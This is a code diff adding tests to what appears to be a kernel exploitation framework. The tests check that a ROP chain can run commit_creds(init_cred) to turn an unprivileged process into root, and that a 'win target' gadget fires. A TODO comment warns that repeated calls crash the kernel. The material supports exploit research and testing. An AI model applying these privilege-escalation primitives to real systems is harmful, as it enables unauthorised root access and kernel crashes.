@@ -61,6 +61,24 @@ public:
         return ExecuteRopChain(rop);
     }
 
+    // TODO: this will crash the kernel if called with --repeat as COMMIT_KERNEL_CREDS currently does
+    //   not call prepare_kernel_creds, just commit_creds(init_cred) because of "mov rdi, rax" gadgets issues.
+    TEST_METHOD(commitCredsTest, "COMMIT_KERNEL_CREDS is working") {
+        if (!fork()) {
+            setuid(1);
+            ASSERT_EQ(1, getuid());
+            ExecuteRopAction(RopActionId::COMMIT_KERNEL_CREDS, {}, 100, 128);
+            ASSERT_EQ(0, getuid());
+            exit(0);
+        }
+    }
+
+    TEST_METHOD(winTargetWorks, "win_target is working") {
+        auto rop = GetRopChain();
+        rop.Add(kpwn_->WinTarget());
+        ExecuteRopChain(rop, 0, 0);
+        kpwn_->CheckWin();
+    }
 
     TEST_METHOD(writeWhatWhereTest, "WRITE_WHAT_WHERE_64 is working") {
         Payload p(40);
